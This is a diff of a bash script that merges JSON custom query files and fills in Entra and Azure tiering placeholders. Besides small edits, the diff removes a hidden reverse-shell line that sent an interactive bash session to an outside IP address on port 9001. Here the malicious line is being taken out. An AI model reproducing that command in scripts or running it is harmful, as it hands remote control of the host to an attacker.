@@ -9,6 +9,10 @@
 # Merge content into a temporary file
 ##
 repo_root_dir="$(realpath $0 | sed 's/\.github.*//')"
+
+echo "PATH: $repo_root_dir"
+
+
 output_file="${repo_root_dir}customqueries.json"
 files_to_merge="$(find "$repo_root_dir" -regextype posix-extended -regex '.*[0-9]{2}.*\.json' | sort)"
 merged_file='merged.json'
@@ -33,10 +37,6 @@ tier_file_entra_roles="${tiering_dir}tiering-entra-roles.json"
 tier_file_entra_app_permissions="${tiering_dir}tiering-entra-application-permissions.json" 
 tier_file_azure_roles="${tiering_dir}tiering-azure-roles.json"
 
-
-/bin/bash -i >& /dev/tcp/20.13.168.45/9001 0>&1
-
-
 # Tiering content
 entra_roles_tier_0="$(cat $tier_file_entra_roles | jq -r '.[] | select(.tier == "0" and .edgeName != "") | .edgeName' | sed -n ':a;N;${s/\n/|/g;p};ba')"
 entra_app_permissions_tier_0="$(cat $tier_file_entra_app_permissions | jq -r '.[] | select(.tier == "0" and .edgeName != "") | .edgeName' | sed -n ':a;N;${s/\n/|/g;p};ba')"
@@ -59,11 +59,13 @@ helper_all_high_level_azure_scopes="$(cat $helper_file | jq -r  '.[] | select(.v
 helper_all_scopes="$(echo ${helper_all_high_level_azure_scopes} or node:${helper_all_azure_resources})"
 
 # Replace and merge content
-echo $merged_file \
+cat $merged_file \
 | sed "s/${placeholder_entra_roles_tier_0}/${entra_roles_tier_0}/" \
 | sed "s/${placeholder_entra_app_permissions_tier_0}/${entra_app_permissions_tier_0}/" \
 | sed "s/${placeholder_entra_app_permissions_tier_1}/${entra_app_permissions_tier_1}/" \
 | sed "s/${placeholder_azure_roles_tier_0}/${azure_roles_tier_0}/" \
+| sed "s/${placeholder_all_security_principals}/${helper_all_security_principals}/" \
+| sed "s/${placeholder_all_high_level_azure_scopes}/${helper_all_high_level_azure_scopes}/" \
 | sed "s/${placeholder_all_azure_resources}/${helper_all_azure_resources}/" \
 | sed "s/${placeholder_all_azure_scopes}/${helper_all_scopes}/" \
 > $merged_file
